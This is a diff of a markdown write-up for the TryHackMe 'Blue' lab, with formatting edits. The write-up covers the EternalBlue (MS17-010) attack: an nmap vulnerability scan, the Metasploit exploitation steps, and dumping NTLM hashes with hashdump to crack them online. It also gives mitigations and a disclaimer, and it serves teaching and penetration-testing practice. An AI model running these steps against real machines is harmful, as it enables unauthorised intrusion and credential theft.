@@ -72,7 +72,6 @@ nmap --script smb-vuln-ms17-010 -p 445 192.168.1.32
 ### 3️⃣ Exploitation
 Launching the attack using Metasploit:
 
-مقتطف الرمز
 ```msf
 msfconsole
 search ms17-010
@@ -87,16 +86,24 @@ exploit
 ### 4️⃣ Post-Exploitation
 Demonstrating full system control and credential theft:
 
-مقتطف الرمز
+
 
 # Check system details
+```msf
 sysinfo
-
+```
 # Dump NTLM hashes
+```msf
 hashdump
+```
+# Crack NTLM hashes
+https://crackstation.net/
+
 ✔️ Hashes cracked via CrackStation to reveal plain-text passwords.
 
-🏁 Results
+
+
+## 🏁 Results
 [x] MS17-010 successfully exploited.
 
 [x] SYSTEM-level access obtained.
@@ -114,15 +121,12 @@ Firewall Rules: Restrict/Block TCP port 445 for external access.
 
 Traffic Monitoring: Monitor for suspicious SMB traffic and RCE attempts.
 
-🔗 References
-🖥️ Vulnerable Machine (Windows 7 – Blue)
+## 🔗 References
+🎓 TryHackMe Room – Blue : https://tryhackme.com/room/blue
 
-🎓 TryHackMe Room – Blue
-
-💥 Metasploit EternalBlue Module
+💥 Metasploit EternalBlue Module: https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
 
 ### 👤 Author
-## Abanoub Ehab | BobXploit Cybersecurity & Penetration Testing
-##
+Abanoub Ehab | BobXploit Cybersecurity & Penetration Testing
+
 Disclaimer: This lab is for educational purposes only. Unauthorized exploitation of computer systems is illegal and unethical.
----
